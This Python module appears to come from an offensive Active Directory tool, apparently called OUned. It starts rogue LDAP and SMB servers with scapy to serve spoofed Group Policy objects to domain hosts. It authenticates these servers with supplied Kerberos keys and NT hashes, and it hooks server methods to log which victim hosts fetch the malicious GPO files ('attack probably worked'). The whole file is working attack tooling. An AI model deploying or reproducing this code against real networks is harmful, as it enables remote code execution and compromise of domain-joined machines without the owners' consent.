import sys
import os
import socket
import threading
from time import sleep

import typer
from helpers.utils import bcolors, logger
from helpers.cli_config import Config


def start_servers(config: Config, clean_folder: str, verbose: int):
    sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'helpers'))
    from scapy.layers.ldapserver import ldapserver, LDAP_Server
    from scapy.layers.smbserver import smbserver, SMBShare, SMB_Server
    from scapy.layers.smb2 import SMB2_Create_Request
    from scapy.layers.spnego import SPNEGOSSP
    from scapy.layers.kerberos import KerberosSSP, Key, EncryptionType
    from scapy.layers.ntlm import NTLMSSP_DOMAIN
    from scapy.arch import get_if_addr

    # Monkey patch LDAP perform_search to include logs specific to OUned
    original_perform_search = LDAP_Server.perform_search
    def perform_search_hook(self, base, scope, filter, attributes):
        try:
            client_ip = self.sock.ins.getpeername()[0]
            if base.lower() == f"cn=policies,cn=system,{config.spoofed_ldap_dn}".lower():
                logger.warning(f"{bcolors.BOLD}[+][LDAP] {client_ip} is fetching the Group Policy Container for GPO {config.gpo_guid}{bcolors.ENDC}")
        except Exception:
            pass
        return original_perform_search(self, base, scope, filter, attributes)
    LDAP_Server.perform_search = perform_search_hook

    # Monkey patch SMB update_smbheader to intercept SMB2_Create_Request
    original_update_smbheader = SMB_Server.update_smbheader
    
    def update_smbheader_hook(self, pkt):
        try:
            # Check if this packet is a file create/open request
            if SMB2_Create_Request in pkt:
                fname = pkt[SMB2_Create_Request].Name if pkt[SMB2_Create_Request].NameLen else b""
                # Name is often UTF-16LE encoded in SMB2
                if "gpt.ini" in str(fname).lower():
                    client_ip = self.sock.ins.getpeername()[0]
                    logger.warning(f"{bcolors.OKGREEN}{bcolors.BOLD}[+][SMB] {client_ip} fetched the gpt.ini file from SMB server - attack probably worked for this host{bcolors.ENDC}")
        except Exception:
            pass
            
        return original_update_smbheader(self, pkt)
    SMB_Server.update_smbheader = update_smbheader_hook

    if config.ldap_aes is not None:
        logger.debug(f"[DEBUG] Using AES-256-CTS-HMAC-SHA1-96 for LDAP authentication with key '{config.ldap_aes}'")
        ldap_key = Key(EncryptionType.AES256_CTS_HMAC_SHA1_96, bytes.fromhex(config.ldap_aes))
    else:
        logger.debug(f"[DEBUG] Using RC4-HMAC for LDAP authentication with key '{config.ldap_nt}'")
        ldap_key = Key(EncryptionType.RC4_HMAC, bytes.fromhex(config.ldap_nt))
    ssp = SPNEGOSSP([KerberosSSP(KEY=ldap_key, SPN=config.spoofed_ldap_spn)])

    start_smb_server = (config.smb_mode != "domain")
    if start_smb_server:
        smb_ssp = NTLMSSP_DOMAIN(UPN=f"{config.smb_machine[:-1]}@{config.domain}", HASHNT=bytes.fromhex(config.smb_nt), DC_FQDN=config.dc_fqdn, DC_IP=config.dc_ip, verb=False)
    else:
        smb_ssp = None

    server_error = []
    smb_server_error = []

    def run_ldap():
        try:
            ldapserver(data=f"{clean_folder}/ldap.json", iface=config.ldap_iface, port=389, ssp=ssp, ACCEPT_EXTENSIBLE=False, verb=verbose)
        except Exception as e:
            server_error.append(e)

    def run_smb():
        try:
            shares = [SMBShare(name=config.smb_share, path=f"{clean_folder}/GPT", remark="")]
            smbserver(shares=shares, iface=config.smb_iface, port=445, ssp=smb_ssp, verb=verbose)
        except Exception as e:
            smb_server_error.append(e)

    server_thread = threading.Thread(target=run_ldap, daemon=True)
    server_thread.start()

    if start_smb_server:
        smb_server_thread = threading.Thread(target=run_smb, daemon=True)
        smb_server_thread.start()

    ldap_iface_ip = get_if_addr(config.ldap_iface)
    smb_iface_ip = get_if_addr(config.smb_iface) if start_smb_server else None
    
    server_ready = False
    smb_server_ready = not start_smb_server

    for _ in range(10):
        if server_error:
            break
        if start_smb_server and smb_server_error:
            break
            
        if not server_ready and not server_error:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    if s.connect_ex((ldap_iface_ip, 389)) == 0:
                        server_ready = True
            except Exception:
                pass

        if start_smb_server and not smb_server_ready and not smb_server_error:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    if s.connect_ex((smb_iface_ip, 445)) == 0:
                        smb_server_ready = True
            except Exception:
                pass

        if server_ready and smb_server_ready:
            break

        sleep(1)

    if server_error:
        logger.error(f"{bcolors.FAIL}[-] Failed to start LDAP server: {server_error[0]}{bcolors.ENDC}")
        raise typer.Exit(1)
    if not server_ready:
        logger.error(f"{bcolors.FAIL}[-] LDAP server did not bind to port 389 in time.{bcolors.ENDC}")
        raise typer.Exit(1)
        
    logger.warning(f"{bcolors.OKGREEN}[+] LDAP server started in thread{bcolors.ENDC}")

    if start_smb_server:
        if smb_server_error:
            logger.error(f"{bcolors.FAIL}[-] Failed to start SMB server: {smb_server_error[0]}{bcolors.ENDC}")
            raise typer.Exit(1)
        if not smb_server_ready:
            logger.error(f"{bcolors.FAIL}[-] SMB server did not bind to port 445 in time.{bcolors.ENDC}")
            raise typer.Exit(1)
        logger.warning(f"{bcolors.OKGREEN}[+] SMB server started in thread{bcolors.ENDC}")
